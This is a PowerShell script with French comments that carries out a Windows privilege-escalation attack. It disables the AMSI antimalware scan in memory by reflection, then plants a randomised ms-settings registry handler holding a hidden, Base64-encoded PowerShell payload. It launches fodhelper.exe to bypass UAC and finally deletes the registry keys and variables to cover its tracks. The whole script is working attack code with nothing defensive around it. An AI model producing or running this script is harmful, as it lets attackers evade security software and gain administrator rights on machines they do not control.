# Obfuscation complète : noms de variables aléatoires, encodage, désactivation des logs
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# Désactiver temporairement AMSI (en mémoire)
try {
    $Am = [Ref].Assembly.GetTypes()
    ForEach ($A in $Am) {
        if ($A.Name -match "Amsi") {
            $Ami = $A.GetFields('NonPublic,Static')
            ForEach ($F in $Ami) {
                if ($F.Name -eq "amsiInitFailed") {
                    $F.SetValue($null, $true)
                }
            }
        }
    }
} catch {}

# Générer un nom de clé COM aléatoire mais valide (ms-settings-*)
$RandomName = -join ((97..122) | Get-Random -Count 10 | ForEach-Object {[char]$_})
$KeyPath = "HKCU:\Software\Classes\ms-settings-$RandomName\Shell\Open\command"

# Commande à exécuter avec élévation (ex: calc)
$Cmd = "Start-Process calc.exe -WindowStyle Hidden"

# Encodage en Base64 (Unicode)
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Cmd)
$EncodedCmd = [Convert]::ToBase64String($Bytes)

# Construction de la payload
$Payload = "powershell -nop -w hidden -enc $EncodedCmd"

# Création discrète des clés de registre
New-Item -Path $KeyPath -Force | Out-Null
New-ItemProperty -Path $KeyPath -Name "DelegateExecute" -Value "" -PropertyType String -Force | Out-Null
Set-ItemProperty -Path $KeyPath -Name "(Default)" -Value $Payload -Type String -Force | Out-Null

# Lancer fodhelper.exe de manière cachée
Start-Process "fodhelper.exe" -WindowStyle Hidden -Verb RunAs -ErrorAction SilentlyContinue | Out-Null

# Attente courte (éviter de tuer trop vite)
Start-Sleep -Milliseconds 2500

# Nettoyage complet du registre
Remove-Item "HKCU:\Software\Classes\ms-settings-$RandomName" -Recurse -Force -ErrorAction SilentlyContinue

# Réinitialisation rapide (optionnel)
Remove-Variable -Name "Payload", "Cmd", "EncodedCmd", "Bytes", "KeyPath" -ErrorAction SilentlyContinue
